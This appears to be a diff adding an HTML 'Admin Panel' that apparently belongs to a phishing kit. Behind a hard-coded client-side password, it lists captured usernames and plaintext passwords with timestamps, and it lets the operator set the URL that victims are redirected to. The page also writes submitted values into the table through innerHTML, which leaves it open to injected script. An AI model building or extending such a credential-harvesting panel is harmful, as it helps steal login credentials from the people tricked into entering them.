@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Admin Panel</title>
+  <link rel="stylesheet" href="admin.css">
+</head>
+<body>
+  <div id="header">
+    <p class="lang">Admin Panel</p>
+  </div>
+  <div id="login">
+    <div class="inputs">
+      <input id="adminPassword" type="password" class="login" placeholder="Enter Admin Password">
+      <button id="loginButton" class="button">Login</button>
+    </div>
+  </div>
+  <div id="panel" style="display: none;">
+    <div class="inputs">
+      <h3 style="color: white;">Set Custom Redirect URL</h3>
+      <input id="redirectUrl" type="url" class="login" placeholder="Enter Redirect URL">
+      <button id="setRedirectButton" class="button">Set Redirect URL</button>
+    </div>
+    <table id="submissionsTable" border="1">
+      <thead>
+        <tr>
+          <th>Username</th>
+          <th>Password</th>
+          <th>Timestamp</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- Data will be dynamically inserted here -->
+      </tbody>
+    </table>
+  </div>
+  <script>
+    const adminPassword = 'admin123'; // Change this as needed
+    const loginDiv = document.getElementById('login');
+    const panelDiv = document.getElementById('panel');
+
+    // Handle Admin Login
+    document.getElementById('loginButton').addEventListener('click', () => {
+      const enteredPassword = document.getElementById('adminPassword').value;
+      if (enteredPassword === adminPassword) {
+        loginDiv.style.display = 'none';
+        panelDiv.style.display = 'block';
+
+        // Populate table with submissions
+        const submissions = JSON.parse(localStorage.getItem('submissions') || '[]');
+        const tableBody = document.getElementById('submissionsTable').querySelector('tbody');
+
+        submissions.forEach(submission => {
+          const row = document.createElement('tr');
+          row.innerHTML = `
+            <td>${submission.username}</td>
+            <td>${submission.password}</td>
+            <td>${new Date(submission.timestamp).toLocaleString()}</td>
+          `;
+          tableBody.appendChild(row);
+        });
+
+        // Load existing redirect URL
+        const currentRedirect = localStorage.getItem('redirectUrl') || '';
+        document.getElementById('redirectUrl').value = currentRedirect;
+      } else {
+        alert('Incorrect password. Please try again.');
+      }
+    });
+
+    // Handle Setting Redirect URL
+    document.getElementById('setRedirectButton').addEventListener('click', () => {
+      const redirectUrl = document.getElementById('redirectUrl').value.trim();
+      if (redirectUrl) {
+        localStorage.setItem('redirectUrl', redirectUrl);
+        alert('Redirect URL has been updated successfully!');
+      } else {
+        alert('Please enter a valid URL.');
+      }
+    });
+  </script>
+</body>
+</html>
